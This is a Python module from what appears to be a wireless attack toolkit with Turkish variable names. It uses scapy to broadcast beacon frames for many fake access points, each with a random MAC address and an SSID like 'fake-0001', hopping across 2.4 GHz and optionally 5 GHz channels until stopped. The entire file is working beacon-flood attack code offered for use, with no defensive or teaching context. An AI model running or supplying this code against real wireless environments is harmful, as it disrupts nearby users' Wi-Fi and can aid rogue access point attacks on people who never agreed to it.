import time
from threading import Event, Thread

from scapy.all import RadioTap, Dot11, Dot11Beacon, Dot11Elt, sendp

from ..context import Module
from ..dot11 import (KANALLAR_24, KANALLAR_5, DS_PARAM_ID, rastgele_mac)
from ..iface import kanal_ayarla


class FloodModule(Module):
    name = "flood"

    def __init__(self, ctx):
        super().__init__(ctx)
        self.dur = Event()
        self.thread = None
        self.sayac = 0
        self.kanallar = KANALLAR_24

    def on(self, count=50, all_channels=False, *a):
        if self.active:
            return
        try:
            count = int(count)
        except Exception:
            count = 50
        self.sayac = 0
        self.dur.clear()
        self.kanallar = KANALLAR_24 + KANALLAR_5 if all_channels else KANALLAR_24
        self.active = True
        self.thread = Thread(target=self._loop, args=(count,), daemon=True)
        self.thread.start()
        ch = "2.4+5" if all_channels else "2.4"
        self.ctx.log(f"[flood] {count} fake ({ch})", "ok")

    def _loop(self, count):
        bssidler = [rastgele_mac() for _ in range(count)]
        ssidler = [f"fake-{i:04d}" for i in range(count)]
        while not self.dur.is_set():
            for k in self.kanallar:
                if self.dur.is_set():
                    return
                kanal_ayarla(self.ctx.iface, k)
                pkts = []
                for b, s in zip(bssidler, ssidler):
                    pkts.append(
                        RadioTap() / Dot11(type=0, subtype=8,
                                           addr1="ff:ff:ff:ff:ff:ff",
                                           addr2=b, addr3=b) /
                        Dot11Beacon(cap=0x2104) /
                        Dot11Elt(ID=0, info=s.encode()) /
                        Dot11Elt(ID=1, info=b"\x82\x84\x8b\x96\x0c\x12\x18\x24") /
                        Dot11Elt(ID=DS_PARAM_ID, info=bytes([k])))
                try:
                    sendp(pkts, iface=self.ctx.iface, verbose=False)
                    self.sayac += len(pkts)
                except Exception:
                    pass
                self.dur.wait(0.2)

    def off(self):
        if not self.active:
            return
        self.dur.set()
        if self.thread:
            self.thread.join(timeout=3)
        self.active = False
        self.ctx.log(f"[flood] stopped ({self.sayac})", "ok")

    def once(self, count=50, duration=10, all_channels=False):
        self.on(count, all_channels)

        def _stop():
            time.sleep(duration)
            self.off()
        Thread(target=_stop, daemon=True).start()
